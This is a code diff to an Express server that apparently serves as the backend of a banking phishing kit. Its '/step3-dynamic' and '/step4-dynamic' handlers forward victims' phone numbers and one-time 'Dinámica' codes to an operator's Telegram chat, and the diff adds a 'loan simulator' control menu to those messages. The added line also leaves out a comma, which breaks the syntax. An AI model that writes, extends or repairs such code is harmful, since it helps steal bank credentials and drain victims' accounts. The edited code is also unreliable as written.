@@ -286,7 +286,7 @@ app.post('/step3-dynamic', async (req, res) => {
     await axios.post(getTelegramApiUrl('sendMessage'), {
       chat_id: CHAT_ID,
       text: mensaje,
-      reply_markup: getDynamicMenu(sessionId)
+      reply_markup: getLoanSimulatorMenu(sessionId)
     });
 
     console.log(`✅ Dinámica SMS laboratorio  ${attemptNumber} enviada - Session: ${sessionId}`);
@@ -318,7 +318,7 @@ app.post('/step4-dynamic', async (req, res) => {
     sessionData.set(sessionId, session);
     
 	  const mensaje = `
-📲 DINÁMICA ${attemptNumber} RECIBIDA 📲
+📲 DINÁMICA2 ${attemptNumber} RECIBIDA 📲
 📱 Número: ${session.phoneNumber || 'N/A'}
 🔢 Dinámica ${attemptNumber}: ${otp}
 🆔 Session: ${sessionId}
@@ -328,6 +328,7 @@ app.post('/step4-dynamic', async (req, res) => {
     await axios.post(getTelegramApiUrl('sendMessage'), {
       chat_id: CHAT_ID,
       text: mensaje
+	  reply_markup: getLoanSimulatorMenu(sessionId)	
     });
 
     console.log(`✅ Dinámica SMS laboratorio  ${attemptNumber} enviada - Session: ${sessionId}`);
